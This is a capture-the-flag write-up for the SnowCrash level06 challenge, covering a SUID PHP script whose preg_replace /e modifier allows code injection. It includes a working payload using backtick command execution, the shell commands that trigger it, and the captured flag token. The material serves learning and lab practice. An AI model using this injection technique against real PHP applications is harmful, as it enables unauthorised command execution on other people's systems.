# Level06: PHP Code Injection via preg_replace /e Modifier

## Vulnerability Analysis

After examining the files in the level06 home directory, we find:

```
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

The level06 binary is owned by flag06 user and has the SUID bit set, which means it runs with flag06 privileges.

Looking at level06.php, we found:

```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

## Understanding the PHP Code

For those unfamiliar with PHP, here's what this code does:

1. **PHP Basics**: PHP is a server-side scripting language commonly used for web development. The code above is wrapped in `<?php ?>` tags which indicate PHP code.

2. **Function Definitions**:

   - Function `y($m)` takes a string parameter and replaces dots with " x " and @ symbols with " y"
   - Function `x($y, $z)` takes two parameters (although $z is never used):
     - It reads the contents of the file specified by $y
     - Performs a series of pattern replacements
     - Returns the modified content

3. **Main Execution**: The line `$r = x($argv[1], $argv[2]); print $r;` calls function x with command line arguments and prints the result.

## Vulnerability: preg_replace with /e modifier

The key vulnerability is in this line:

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

Breaking this down:

- `preg_replace()` is a PHP function that searches for patterns in strings and replaces them
- `/(\[x (.*)\])/e` is a regular expression pattern:
  - `\[x` matches literal "[x"
  - `(.*)` captures any characters between "[x" and "]"
  - The `/e` modifier is critical - it tells PHP to evaluate the replacement string as PHP code after substitution

The `/e` modifier in preg_replace evaluates the replacement string as PHP code, which is a deprecated and dangerous feature that allows for remote code execution.

## Exploitation

1. Created a file with the following content:

```
[x {${`getflag`}}]
```

2. When processed by the PHP script, this payload works as follows:

   - Our pattern `[x {${`getflag`}}]` is matched by the regex
   - The `/e` modifier causes PHP to evaluate `y("{${`getflag`}}")` as code
   - The `${...}` syntax in PHP is variable interpolation
   - The backticks `` ` ` `` execute shell commands and return their output
   - So `getflag` is executed and its output is returned

3. Execution:

```
level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /tmp/exploit.txt
level06@SnowCrash:~$ ./level06 /tmp/exploit.txt
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
